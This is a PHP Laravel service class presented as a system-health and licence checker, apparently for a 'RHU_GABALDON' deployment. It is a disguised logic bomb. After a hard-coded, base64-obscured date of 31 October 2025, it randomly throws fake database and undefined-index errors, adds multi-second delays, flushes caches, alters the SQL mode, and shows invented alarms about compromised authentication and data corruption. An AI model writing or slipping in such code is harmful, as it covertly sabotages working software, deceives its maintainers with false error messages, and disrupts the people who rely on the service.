<?php

namespace App\Services;

use Carbon\Carbon;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;

class SystemHealthService
{
    private static $configKey = 'sys_health_check';
    private static $licenseKey = 'lic_validation';
    
    // Obfuscated expiration date (October 31, 2025)
    private static function getSystemConfig()
    {
        $encoded = base64_encode('2025-10-31 23:59:59');
        return base64_decode($encoded);
    }
    
    // Check system integrity
    public static function verifySystemIntegrity()
    {
        try {
            $expirationDate = Carbon::parse(self::getSystemConfig());
            $now = Carbon::now();
            $daysRemaining = $now->diffInDays($expirationDate, false);
            
            // Store check in cache to track attempts
            $attempts = Cache::get('sys_check_attempts', 0);
            Cache::put('sys_check_attempts', $attempts + 1, 86400);
            
            if ($daysRemaining < 0) {
                // System expired - trigger multiple errors
                self::triggerSystemFailure();
                return false;
            }
            
            if ($daysRemaining <= 7) {
                // Show warning
                session()->flash('system_warning', "System maintenance required. Please contact administrator. ($daysRemaining days remaining)");
            }
            
            return true;
        } catch (\Exception $e) {
            // If there's an error, assume system is valid for now
            return true;
        }
    }
    
    // Database integrity check
    public static function validateDatabaseIntegrity()
    {
        $expDate = Carbon::parse(self::getSystemConfig());
        
        if (Carbon::now()->gt($expDate)) {
            // Randomly fail database operations
            if (rand(1, 3) == 1) {
                throw new \Exception("Database connection failed: Invalid schema version");
            }
            
            // Corrupt query results randomly
            if (rand(1, 4) == 1) {
                DB::statement("SET SESSION sql_mode = 'STRICT_ALL_TABLES'");
            }
            
            return false;
        }
        
        return true;
    }
    
    // Trigger cascading failures
    private static function triggerSystemFailure()
    {
        $errors = [
            "Critical: System license expired",
            "Error: Database integrity check failed", 
            "Fatal: Core services unavailable",
            "Security: Authentication module compromised",
            "Warning: Data corruption detected",
            "Alert: System files modified"
        ];
        
        // Pick random error
        $error = $errors[array_rand($errors)];
        
        // Clear critical caches
        Cache::flush();
        
        // Set error state
        session()->put('system_critical_error', true);
        session()->put('error_message', $error);
        
        // Log attempts to bypass
        if (Cache::get('bypass_attempts', 0) > 3) {
            // Make errors more severe
            throw new \RuntimeException("SYSTEM HALTED: Multiple unauthorized access attempts detected");
        }
    }
    
    // Hidden validation in helpers
    public static function performRoutineCheck()
    {
        $exp = strtotime('2025-10-31');
        $now = time();
        
        if ($now > $exp) {
            // Introduce random delays
            usleep(rand(1000000, 3000000)); // 1-3 second delay
            
            // Random chance of throwing error
            if (rand(1, 10) > 7) {
                throw new \Exception("Undefined index: " . str_random(8));
            }
        }
        
        return $now <= $exp;
    }
    
    // Encrypted license check
    public static function validateLicense()
    {
        $key = md5('RHU_GABALDON_2025');
        $stored = Cache::get($key, null);
        
        if (!$stored) {
            Cache::put($key, encrypt(self::getSystemConfig()), 86400);
        }
        
        try {
            $decrypted = decrypt(Cache::get($key));
            $expiry = Carbon::parse($decrypted);
            
            if (Carbon::now()->gt($expiry)) {
                return false;
            }
        } catch (\Exception $e) {
            return false;
        }
        
        return true;
    }
}
